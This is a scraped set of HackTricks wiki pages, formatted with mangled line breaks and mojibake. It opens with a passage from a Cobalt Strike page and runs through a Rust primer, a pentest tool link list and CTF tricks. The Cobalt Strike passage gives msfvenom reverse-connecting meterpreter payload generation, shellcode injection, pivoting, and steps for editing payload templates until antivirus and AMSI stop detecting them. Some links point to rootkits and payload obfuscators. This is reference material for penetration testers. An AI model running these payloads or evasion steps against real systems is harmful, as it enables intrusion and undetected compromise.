Meterpreter sessions with the foreign listener.\n‚Äã\n# Pass session to Metasploit - Through shellcode injection\n## On metasploit host\nmsfvenom\n-p\nwindows/x64/meterpreter_reverse_http\nLHOST\n=<\nIP\n>\nLPORT\n=<\nPORT\n>\n-f\nraw\n-o\n/tmp/msf.bin\n## Run msfvenom and prepare the multi/handler listener\n‚Äã\n## Copy bin file to cobalt strike host\nps\nshinject\n<\npid\n>\nx64 C:\n\\\nPayloads\n\\\nmsf.bin\n#Inject metasploit shellcode in a x64 process\n‚Äã\n# Pass metasploit session to cobalt strike\n## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.\n## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode\n‚Äã\n‚Äã\n# Pivoting\n## Open a socks proxy in the teamserver\nbeacon\n>\nsocks\n1080\n‚Äã\n# SSH connection\nbeacon\n>\nssh\n10.10\n.17.12:22 username password\nAvoiding AVs\nArtifact Kit\nUsually in\n/opt/cobaltstrike/artifact-kit\nyou can find the code and pre-compiled templates (in\n/src-common\n) of the payloads that cobalt strike is going to use to generate the binary beacons.\nUsing\nThreatCheck\nwith the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.\nAfter modifying the code just run\n./build.sh\nfrom the same directory and copy the\ndist-pipe/\nfolder into the Windows client in\nC:\\Tools\\cobaltstrike\\ArtifactKit\n.\npscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .\nDon't forget to load the aggressive script\ndist-pipe\\artifact.cna\nto indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.\nResource Kit\nThe ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.\nUsing\nThreatCheck\nwith the templates you can find what is defender (AMSI in this case) not liking and modify it:\n.\\ThreatCheck.exe -e AMSI -f .\\cobaltstrike\\ResourceKit\\template.x64.ps1\nModifying the detected lines one can generate a template that won't be caught.\nDon't forget to load the aggressive script\nResourceKit\\resources.cna\nto indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.\ncd\nC:\n\\\nTools\n\\\nneo4j\n\\\nbin\nneo4j.bat console\nhttp://localhost:7474/ --\n>\nChange password\nexecute-assembly C:\n\\\nTools\n\\\nSharpHound3\n\\\nSharpHound3\n\\\nbin\n\\\nDebug\n\\\nSharpHound.exe\n-c\nAll\n-d\nDOMAIN.LOCAL\n‚Äã\n‚Äã\n‚Äã\n# Change powershell\nC:\n\\\nTools\n\\\ncobaltstrike\n\\\nResourceKit\ntemplate.x64.ps1\n# Change $var_code -> $polop\n# $x --> $ar\ncobalt strike --\n>\nscript manager --\n>\nLoad --\n>\nCargar C:\n\\\nTools\n\\\ncobaltstrike\n\\\nResourceKit\n\\\nresources.cna\n‚Äã\n#artifact kit\ncd\nC:\n\\\nTools\n\\\ncobaltstrike\n\\\nArtifactKit\npscp\n-r\nroot@kali:/opt/cobaltstrike/artifact-kit/dist-pipe\n.\n‚Äã\n‚Äã\nC2 -\nPrevious\nICMPsh\nNext\n- TODO\nOther Big References\nLast modified\n8mo ago"
    },
    {
        "title": "Other Big References",
        "url": "https://book.hacktricks.xyz/todo/references",
        "text": "Other Big References\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPenetration Testing Tools Cheat Sheet\nPentesting Cheatsheet\nhausec\nPentesting Cheatsheet\nBlog Simple\nInfrastructure PenTest Series : Part 2 - Vulnerability Analysis ‚Äî tech.bitvijays.com\nPentesting Cheatsheets\nRed Teaming Experiments\nBasics of Windows ¬∑ pentestbook\npentest-notes/OSCP-Survival-Guide.md at master ¬∑ wwong99/pentest-notes\nGitHub\nOSCP Fun Guide\nBlog Simple\nIntroduction\nThe Hacker Recipes\nGitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF\nGitHub\nGTFOBins\nGitHub - RistBS/Awesome-RedTeam-Cheatsheet: Active Directory & Red-Team Cheat-Sheet in constant expansion.\nGitHub\nGitHub - S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet: A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.\nGitHub\nhttps://hideandsec.sh/\nhideandsec.sh\nOffensive Security Cheatsheet\nhttps://infosecwriteups.com/\ninfosecwriteups.com\nOffensive Security‚Äôs Exploit Database Archive\nWADComs\nLOLBAS\n/home/six2dez/.pentest-book\nPentest Book\nHacking Articles\nHacking Articles\nPenetration Testing Lab\nPenetration Testing Lab\nIppSec - Search\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nC2 -\nPrevious\nCobalt Strike\nNext\n- TODO\nRust Basics\nLast modified\n1mo ago"
    },
    {
        "title": "Rust Basics",
        "url": "https://book.hacktricks.xyz/todo/rust-basics",
        "text": "Rust Basics\nGeneric Types\nCreate a struct where 1 of their values could be any type\nstruct\nWrapper\n<\nT\n>\n{\nvalue\n:\nT\n,\n}\n‚Äã\nimpl\n<\nT\n>\nWrapper\n<\nT\n>\n{\npub\nfn\nnew\n(\nvalue\n:\nT\n)\n->\nSelf\n{\nWrapper\n{\nvalue\n}\n}\n}\n‚Äã\nWrapper\n::\nnew\n(\n42\n).\nvalue\nWrapper\n::\nnew\n(\n\"Foo\"\n).\nvalue\n,\n\"Foo\"\nOption, Some & None\nThe Option type means that the value might by of type Some (there is something) or None:\npub\nenum\nOption\n<\nT\n>\n{\nNone\n,\nSome\n(\nT\n),\n}\nYou can use functions such as\nis_some()\nor\nis_none()\nto check the value of the Option.\nMacros\nMacros are more powerful than functions because they expand to produce more code than the code you‚Äôve written manually. For example, a function signature must declare the number and type of parameters the function has. Macros, on the other hand, can take a variable number of parameters: we can call\nprintln!(\"hello\")\nwith one argument or\nprintln!(\"hello {}\", name)\nwith two arguments. Also, macros are expanded before the compiler interprets the meaning of the code, so a macro can, for example, implement a trait on a given type. A function can‚Äôt, because it gets called at runtime and a trait needs to be implemented at compile time.\nmacro_rules!\nmy_macro\n{\n()\n=>\n{\nprintln!\n(\n\"Check out my macro!\"\n);\n};\n(\n$val\n:\nexpr\n)\n=>\n{\nprintln!\n(\n\"Look at this other macro: {}\"\n,\n$val\n);\n}\n}\nfn\nmain\n()\n{\nmy_macro!\n();\nmy_macro!\n(\n7777\n);\n}\n‚Äã\n// Export a macro from a module\nmod\nmacros\n{\n#[macro_export]\nmacro_rules!\nmy_macro\n{\n()\n=>\n{\nprintln!\n(\n\"Check out my macro!\"\n);\n};\n}\n}\nIterate\n// Iterate through a vector\nlet\nmy_fav_fruits\n=\nvec!\n[\n\"banana\"\n,\n\"raspberry\"\n];\nlet\nmut\nmy_iterable_fav_fruits\n=\nmy_fav_fruits\n.\niter\n();\nassert_eq!\n(\nmy_iterable_fav_fruits\n.\nnext\n(),\nSome\n(\n&\n\"banana\"\n));\nassert_eq!\n(\nmy_iterable_fav_fruits\n.\nnext\n(),\nSome\n(\n&\n\"raspberry\"\n));\nassert_eq!\n(\nmy_iterable_fav_fruits\n.\nnext\n(),\nNone\n);\n// When it's over, it's none\n// One line iteration with action\nmy_fav_fruits\n.\niter\n().\nmap\n(\n|\nx\n|\ncapitalize_first\n(\nx\n)).\ncollect\n()\n‚Äã\n// Hashmap iteration\nfor\n(\nkey\n,\nhashvalue\n)\nin\n&*\nmap\n{\nfor\nkey\nin\nmap\n.\nkeys\n()\n{\nfor\nvalue\nin\nmap\n.\nvalues\n()\n{\nRecursive Box\nenum\nList\n{\nCons\n(\ni32\n,\nList\n),\nNil\n,\n}\n‚Äã\nlet\nlist\n=\nCons\n(\n1\n,\nCons\n(\n2\n,\nCons\n(\n3\n,\nNil\n)));\nConditionals\nif\nlet\nn\n=\n5\n;\nif\nn\n<\n0\n{\nprint!\n(\n\"{} is negative\"\n,\nn\n);\n}\nelse\nif\nn\n>\n0\n{\nprint!\n(\n\"{} is positive\"\n,\nn\n);\n}\nelse\n{\nprint!\n(\n\"{} is zero\"\n,\nn\n);\n}\nmatch\nmatch\nnumber\n{\n// Match a single value\n1\n=>\nprintln!\n(\n\"One!\"\n),\n// Match several values\n2\n|\n3\n|\n5\n|\n7\n|\n11\n=>\nprintln!\n(\n\"This is a prime\"\n),\n// TODO ^ Try adding 13 to the list of prime values\n// Match an inclusive range\n13\n..=\n19\n=>\nprintln!\n(\n\"A teen\"\n),\n// Handle the rest of cases\n_\n=>\nprintln!\n(\n\"Ain't special\"\n),\n}\n‚Äã\nlet\nboolean\n=\ntrue\n;\n// Match is an expression too\nlet\nbinary\n=\nmatch\nboolean\n{\n// The arms of a match must cover all the possible values\nfalse\n=>\n0\n,\ntrue\n=>\n1\n,\n// TODO ^ Try commenting out one of these arms\n};\nloop (infinite)\nloop\n{\ncount\n+=\n1\n;\nif\ncount\n==\n3\n{\nprintln!\n(\n\"three\"\n);\ncontinue\n;\n}\nprintln!\n(\n\"{}\"\n,\ncount\n);\nif\ncount\n==\n5\n{\nprintln!\n(\n\"OK, that's enough\"\n);\nbreak\n;\n}\n}\nwhile\nlet\nmut\nn\n=\n1\n;\nwhile\nn\n<\n101\n{\nif\nn\n%\n15\n==\n0\n{\nprintln!\n(\n\"fizzbuzz\"\n);\n}\nelse\nif\nn\n%\n5\n==\n0\n{\nprintln!\n(\n\"buzz\"\n);\n}\nelse\n{\nprintln!\n(\n\"{}\"\n,\nn\n);\n}\nn\n+=\n1\n;\n}\nfor\nfor\nn\nin\n1\n..\n101\n{\nif\nn\n%\n15\n==\n0\n{\nprintln!\n(\n\"fizzbuzz\"\n);\n}\nelse\n{\nprintln!\n(\n\"{}\"\n,\nn\n);\n}\n}\n‚Äã\n// Use \"..=\" to make inclusive both ends\nfor\nn\nin\n1\n..=\n100\n{\nif\nn\n%\n15\n==\n0\n{\nprintln!\n(\n\"fizzbuzz\"\n);\n}\nelse\nif\nn\n%\n3\n==\n0\n{\nprintln!\n(\n\"fizz\"\n);\n}\nelse\nif\nn\n%\n5\n==\n0\n{\nprintln!\n(\n\"buzz\"\n);\n}\nelse\n{\nprintln!\n(\n\"{}\"\n,\nn\n);\n}\n}\n‚Äã\n// ITERATIONS\n‚Äã\nlet\nnames\n=\nvec!\n[\n\"Bob\"\n,\n\"Frank\"\n,\n\"Ferris\"\n];\n//iter - Doesn't consume the collection\nfor\nname\nin\nnames\n.\niter\n()\n{\nmatch\nname\n{\n&\n\"Ferris\"\n=>\nprintln!\n(\n\"There is a rustacean among us!\"\n),\n_\n=>\nprintln!\n(\n\"Hello {}\"\n,\nname\n),\n}\n}\n//into_iter - COnsumes the collection\nfor\nname\nin\nnames\n.\ninto_iter\n()\n{\nmatch\nname\n{\n\"Ferris\"\n=>\nprintln!\n(\n\"There is a rustacean among us!\"\n),\n_\n=>\nprintln!\n(\n\"Hello {}\"\n,\nname\n),\n}\n}\n//iter_mut - This mutably borrows each element of the collection\nfor\nname\nin\nnames\n.\niter_mut\n()\n{\n*\nname\n=\nmatch\nname\n{\n&\nmut\n\"Ferris\"\n=>\n\"There is a rustacean among us!\"\n,\n_\n=>\n\"Hello\"\n,\n}\n}\nif let\nlet\noptional_word\n=\nSome\n(\nString\n::\nfrom\n(\n\"rustlings\"\n));\nif\nlet\nword\n=\noptional_word\n{\nprintln!\n(\n\"The word is: {}\"\n,\nword\n);\n}\nelse\n{\nprintln!\n(\n\"The optional word doesn't contain anything\"\n);\n}\nwhile let\nlet\nmut\noptional\n=\nSome\n(\n0\n);\n// This reads: \"while `let` destructures `optional` into\n// `Some(i)`, evaluate the block (`{}`). Else `break`.\nwhile\nlet\nSome\n(\ni\n)\n=\noptional\n{\nif\ni\n>\n9\n{\nprintln!\n(\n\"Greater than 9, quit!\"\n);\noptional\n=\nNone\n;\n}\nelse\n{\nprintln!\n(\n\"`i` is `{:?}`. Try again.\"\n,\ni\n);\noptional\n=\nSome\n(\ni\n+\n1\n);\n}\n// ^ Less rightward drift and doesn't require\n// explicitly handling the failing case.\n}\nTraits\nCreate a new method for a type\ntrait\nAppendBar\n{\nfn\nappend_bar\n(\nself\n)\n->\nSelf\n;\n}\n‚Äã\nimpl\nAppendBar\nfor\nString\n{\nfn\nappend_bar\n(\nself\n)\n->\nSelf\n{\nformat!\n(\n\"{}Bar\"\n,\nself\n)\n}\n}\n‚Äã\nlet\ns\n=\nString\n::\nfrom\n(\n\"Foo\"\n);\nlet\ns\n=\ns\n.\nappend_bar\n();\nprintln!\n(\n\"s: {}\"\n,\ns\n);\nTests\n#[cfg(test)]\nmod\ntests\n{\n#[test]\nfn\nyou_can_assert\n()\n{\nassert!\n(\ntrue\n);\nassert_eq!\n(\ntrue\n,\ntrue\n);\nassert_ne!\n(\ntrue\n,\nfalse\n);\n}\n}\nThreading\nArc\nAn Arc can use Clone to create more references over the object to pass them to the threads. When the last reference pointer to a value is out of scope, the variable is dropped.\nuse\nstd\n::\nsync\n::\nArc\n;\nlet\napple\n=\nArc\n::\nnew\n(\n\"the same apple\"\n);\nfor\n_\nin\n0\n..\n10\n{\nlet\napple\n=\nArc\n::\nclone\n(\n&\napple\n);\nthread\n::\nspawn\n(\nmove\n||\n{\nprintln!\n(\n\"{:?}\"\n,\napple\n);\n});\n}\nThreads\nIn this case we will pass the thread a variable it will be able to modify\nfn\nmain\n()\n{\nlet\nstatus\n=\nArc\n::\nnew\n(\nMutex\n::\nnew\n(\nJobStatus\n{\njobs_completed\n:\n0\n}));\nlet\nstatus_shared\n=\nArc\n::\nclone\n(\n&\nstatus\n);\nthread\n::\nspawn\n(\nmove\n||\n{\nfor\n_\nin\n0\n..\n10\n{\nthread\n::\nsleep\n(\nDuration\n::\nfrom_millis\n(\n250\n));\nlet\nmut\nstatus\n=\nstatus_shared\n.\nlock\n().\nunwrap\n();\nstatus\n.\njobs_completed\n+=\n1\n;\n}\n});\nwhile\nstatus\n.\nlock\n().\nunwrap\n().\njobs_completed\n<\n10\n{\nprintln!\n(\n\"waiting... \"\n);\nthread\n::\nsleep\n(\nDuration\n::\nfrom_millis\n(\n500\n));\n}\n}\nTODO -\nPrevious\nOther Big References\nNext\n- TODO\nMore Tools\nLast modified\n1yr ago"
    },
    {
        "title": "More Tools",
        "url": "https://book.hacktricks.xyz/todo/more-tools",
        "text": "More Tools\n‚Äã\n‚òÅ\u0000\u0000Ô∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBlueTeam\n‚Äã\nhttps://github.com/yarox24/attack_monitor\n‚Äã\n‚Äã\nhttps://capsule8.com/blog/dont-get-kicked-out-a-tale-of-rootkits-and-other-backdoors/\n‚Äã\n‚Äã\nhttps://github.com/ION28/BLUESPAWN\n‚Äã\n‚Äã\nhttps://github.com/PaperMtn/lil-pwny\n: Check disclosed accounts\n‚Äã\nhttps://github.com/rabobank-cdc/DeTTECT\n‚Äã\nOSINT\n‚Äã\nhttps://github.com/3vangel1st/kamerka\n‚Äã\n‚Äã\nhttps://github.com/BullsEye0/google_dork_list\n‚Äã\n‚Äã\nhttps://github.com/highmeh/lure\n‚Äã\n‚Äã\nhttps://www.shodan.io/\n‚Äã\n‚Äã\nhttps://censys.io/\n‚Äã\n‚Äã\nhttps://viz.greynoise.io/table\n‚Äã\n‚Äã\nhttps://www.zoomeye.org\n‚Äã\n‚Äã\nhttps://fofa.so\n‚Äã\n‚Äã\nhttps://www.onyphe.io\n‚Äã\n‚Äã\nhttps://app.binaryedge.io\n‚Äã\n‚Äã\nhttps://hunter.io\n‚Äã\n‚Äã\nhttps://wigle.net\n‚Äã\n‚Äã\nhttps://ghostproject.fr\n‚Äã\n‚Äã\nhttps://www.oshadan.com/\n‚Äã\n‚Äã\nhttps://builtwith.com/\n‚Äã\n‚Äã\nhttps://www.spiderfoot.net/\n‚Äã\n‚Äã\nhttps://github.com/zricethezav/gitleaks\n‚Äã\n‚Äã\nhttps://www.nmmapper.com/sys/tools/subdomainfinder/\n: 8 Subdomain finder tools, sublist3r, amass and more\nWEB\n‚Äã\nhttps://github.com/AlisamTechnology/ATSCAN\n‚Äã\n‚Äã\nhttps://github.com/momenbasel/KeyFinder\n‚Äã\n‚Äã\nhttps://github.com/hahwul/XSpear\n‚Äã\n‚Äã\nhttps://github.com/BitTheByte/Monitorizer/\n‚Äã\n‚Äã\nhttps://github.com/spinkham/skipfish\n‚Äã\n‚Äã\nhttps://github.com/blark/aiodnsbrute\n: Brute force domain names asynchronously\n‚Äã\nhttps://crt.sh/?q=%.yahoo.com\n: Subdomain bruteforce\n‚Äã\nhttps://github.com/tomnomnom/httprobe\n: Check if web servers in a domain are accessible\n‚Äã\nhttps://github.com/aboul3la/Sublist3r\n: Subdomain discovery\n‚Äã\nhttps://github.com/gwen001/github-search/blob/master/github-subdomains.py\n: Subdomain discovery in github\n‚Äã\nhttps://github.com/robertdavidgraham/masscan\n: Fast port scanning\n‚Äã\nhttps://github.com/Threezh1/JSFinder\n: Subdomains and URLs from JS files in a web\n‚Äã\nhttps://github.com/C1h2e1/MyFuzzingDict\n: Web files dictionary\n‚Äã\nhttps://github.com/TypeError/Bookmarks/blob/master/README.md\n: BurpExtension to avoid dozens repeater tabs\n‚Äã\nhttps://github.com/hakluke/hakrawler\n: Obtain assets\n‚Äã\nhttps://github.com/izo30/google-dorker\n: Google dorks\n‚Äã\nhttps://github.com/sehno/Bug-bounty/blob/master/bugbounty_checklist.md\n: Web BugBounty checklist\n‚Äã\nhttps://github.com/Naategh/dom-red\n: Check a list of domain against Open Redirection\n‚Äã\nhttps://github.com/prodigysml/Dr.-Watson\n: Burp plugin, offline analysis to discover domains, subdomains and IPs\n‚Äã\nhttps://github.com/hahwul/WebHackersWeapons\n: List of different tools\n‚Äã\nhttps://github.com/gauravnarwani97/Trishul\n: BurpSuite Plugingto find vulns (SQLi, XSS, SSTI)\n‚Äã\nhttps://github.com/fransr/postMessage-tracker\n: Chrome extension for tracking post-messages functions\n‚Äã\nhttps://github.com/Quitten/Autorize\n: Automatic authentication tests (remove cookies and try to send the request)\n‚Äã\nhttps://github.com/pikpikcu/xrcross\n: XRCross is a Reconstruction, Scanner, and a tool for penetration / BugBounty testing. This tool was built to test (XSS|SSRF|CORS|SSTI|IDOR|RCE|LFI|SQLI) vulnerabilities\nWindows\n‚Äã\nhttps://github.com/Mr-Un1k0d3r/PoisonHandler\n: Lateral movements\n‚Äã\nhttps://freddiebarrsmith.com/trix/trix.html\n: LOL bins\n‚Äã\nhttps://gist.github.com/netbiosX/ee35fcd3722e401a38136cff7b751d79\n(\nhttps://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/\n): Persistence\n‚Äã\nhttps://github.com/odzhan/injection\n: Windows Process Injection techniques\n‚Äã\nhttps://github.com/BankSecurity/Red_Team\n: Red Team scripts\n‚Äã\nhttps://github.com/l0ss/Grouper2\n: find security-related misconfigurations in Active Directory Group Policy.\n‚Äã\nhttps://www.wietzebeukema.nl/blog/powershell-obfuscation-using-securestring\n: Securestring obfuscation\n‚Äã\nhttps://pentestlab.blog/2020/02/24/parent-pid-spoofing/\n: Parent PID Spoofing\n‚Äã\nhttps://github.com/the-xentropy/xencrypt\n: Encrypt Powershell payloads\n‚Äã\nhttps://shells.systems/introducing-ninja-c2-the-c2-built-for-stealth-red-team-operations/\n: Stealth C2\n‚Äã\nhttps://windows-internals.com/faxing-your-way-to-system/\n: Series of logs about Windows Internals\n‚Äã\nhttps://bestestredteam.com/2018/10/02/tracking-pixel-in-microsoft-office-document/\n: Track who open a document\n‚Äã\nhttps://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet\n: Active Directory Cheat Sheet\nFirmware\nTools q veo q pueden molar para analizar firmares (automaticas):\n‚Äã\nhttps://github.com/craigz28/firmwalker\n‚Äã\n‚Äã\nhttps://github.com/fkie-cad/FACT_core\n‚Äã\n‚Äã\nhttps://gitlab.com/bytesweep/bytesweep-go\n‚Äã\nPost-crema:\n‚Äã\nhttps://blog.mindedsecurity.com/2018/09/pentesting-iot-devices-part-1-static.html\n‚Äã\n‚Äã\nhttps://blog.mindedsecurity.com/2018/10/pentesting-iot-devices-part-2-dynamic.html\n‚Äã\nComo extraer firmware si no lo encontramos online:\nhttps://www.youtube.com/watch?v=Kxvpbu9STU4\n‚Äã\nAqui un firware con vulnerabilidades para analizar:\nhttps://github.com/scriptingxss/IoTGoat\n‚Äã\ny por aqui la metodologia owasp para analizar firmware:\nhttps://github.com/scriptingxss/owasp-fstm\n‚Äã\nFirmware emulation: FIRMADYNE (https://github.com/firmadyne/firmadyne/) is a platform for automating the emulation and dynamic analysis of Linux-based firmware.\nOTHER\n‚Äã\nhttps://twitter.com/HackAndDo/status/1202695084543791117\n‚Äã\n‚Äã\nhttps://github.com/weev3/LKWA\n‚Äã\n‚Äã\nhttps://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/\n‚Äã\n‚Äã\nhttps://github.com/skelsec/jackdaw\n‚Äã\n‚Äã\nhttps://github.com/CoatiSoftware/Sourcetrail\n: Static code analysis\n‚Äã\nhttps://www.hackerdecabecera.com/2019/12/blectf-capture-flag-en-formato-hardware.html\n: Bluetooth LE CTF\n‚Äã\nhttps://github.com/skeeto/endlessh\n: SSH tarpit that slowly sends an endless banner.\nAWS and Cloud tools:\nhttps://github.com/toniblyx/my-arsenal-of-aws-security-tools\n‚Äã\nIFS (Interplanetary File System) for phising:\nhttps://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/using-the-interplanetary-file-system-for-offensive-operations/\n‚Äã\nIP rotation services:\nhttps://medium.com/@lokeshdlk77/how-to-rotate-ip-address-in-brute-force-attack-e66407259212\n‚Äã\nLinux rootkit:\nhttps://github.com/aesophor/satanic-rootkit\n‚Äã\n‚Äã\nhttps://theia-ide.org/\n: Online IDE\n‚Äã\nhttps://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/\n: Resources for starting on BugBounties\n‚Äã\nhttps://medium.com/macoclock/jailbreak-and-stuff-kickstart-tools-and-techniques-for-ios-application-pentesting-6fa53a3987ab\n: IOS pentesting tools\n‚Äã\nhttps://github.com/random-robbie/keywords/blob/master/keywords.txt\n: Keywords\n‚Äã\nhttps://github.com/ElevenPaths/HomePWN\n: Hacking IoT (Wifi, BLE, SSDP, MDNS)\n‚Äã\nhttps://github.com/rackerlabs/scantron\n: automating scanning\n‚Äã\nhttps://github.com/doyensec/awesome-electronjs-hacking\n: This list aims to cover Electron.js security related topics.\n‚Äã\nhttps://github.com/serain/bbrecon\n: Info about BB programs\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\nRust Basics\nNext\n- TODO\nMISC\nLast modified\n6mo ago"
    },
    {
        "title": "MISC",
        "url": "https://book.hacktricks.xyz/todo/misc",
        "text": "MISC\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nIn a ping response TTL:\n127 = Windows\n254 = Cisco\nLo dem√°s,algunlinux\n$1$- md5\n$2$or $2a$ - Blowfish\n$5$- sha256\n$6$- sha512\nIf you do not know what is behind a service, try to make and HTTP GET request.\nUDP Scans\nnc -nv -u -z -w 1 <IP> 160-16\nAn empty UDP packet is sent to a specific port. If the UDP port is open, no reply is sent back from the target machine. If the UDP port is closed, an ICMP port unreachable packet should be sent back from the target machine.\\\nUDP port scanning is often unreliable, as firewalls and routers may drop ICMP\npackets. This can lead to false positives in your scan, and you will regularly see\nUDP port scans showing all UDP ports open on a scanned machine.\no Most port scanners do not scan all available ports, and usually have a preset list\nof ‚Äúinteresting ports‚Äù that are scanned.\nCTF - Tricks\nIn\nWindows\nuse\nWinzip\nto search for files.\nAlternate data Streams\n:\ndir /r | find \":$DATA\"\n\\\nbinwalk --dd=\".*\" <file> #Extract everything\nbinwalk -M -e -d=10000 suspicious.pdf #Extract, look inside extracted files and continue extracing (depth of 10000)\nCrypto\nfeatherduster\n\\\nBasae64\n(6‚Äî>8) ‚Äî> 0...9, a...z, A‚Ä¶Z,+,/\nBase32\n(5 ‚Äî>8) ‚Äî> A‚Ä¶Z, 2‚Ä¶7\nBase85\n(Ascii85, 7‚Äî>8) ‚Äî> 0...9, a...z, A...Z, ., -, :, +, =, ^, !, /, *, ?, &, <, >, (, ), [, ], {, }, @, %, $, #\nUuencode\n--> Start with \"\nbegin <mode> <filename>\n\" and weird chars\nXxencoding\n--> Start with \"\nbegin <mode> <filename>\n\" and B64\nVigenere\n(frequency analysis) ‚Äî>\nhttps://www.guballa.de/vigenere-solver\nScytale\n(offset of characters) ‚Äî>\nhttps://www.dcode.fr/scytale-cipher\n‚Äã\n25x25 = QR\nfactordb.com\nrsatool\nSnow --> Hide messages using spaces and tabs\nCharacters\n%E2%80%AE => RTL Character (writes payloads backwards)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\nMore Tools\nNext\n- TODO\nPentesting DNS\nLast modified\n6mo ago"
    },
    {
        "title": "Pentesting DNS",
        "url": "https://book.hacktricks.xyz/todo/pentesting-dns",
